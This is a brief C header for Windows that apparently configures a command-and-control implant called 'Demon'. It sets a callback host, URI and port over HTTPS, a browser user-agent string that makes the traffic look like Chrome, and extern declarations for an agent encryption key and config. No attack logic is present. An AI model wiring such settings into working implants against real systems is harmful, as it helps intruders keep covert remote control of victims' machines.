#ifndef DEMON_CONFIG_H
#define DEMON_CONFIG_H

#include <windows.h>

#define     CONFIG_URI          L"/index.php"
#define     CONFIG_HOST         L"192.168.0.148"
#define     CONFIG_PORT         443
#define     CONFIG_USERAGENT    L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
#define     CONFIG_SECURE       true

extern BYTE AgentEncryptionKey[ 32 ];
extern BYTE AgentConfig[ 1024 ];

VOID ConfigInit();

#endif
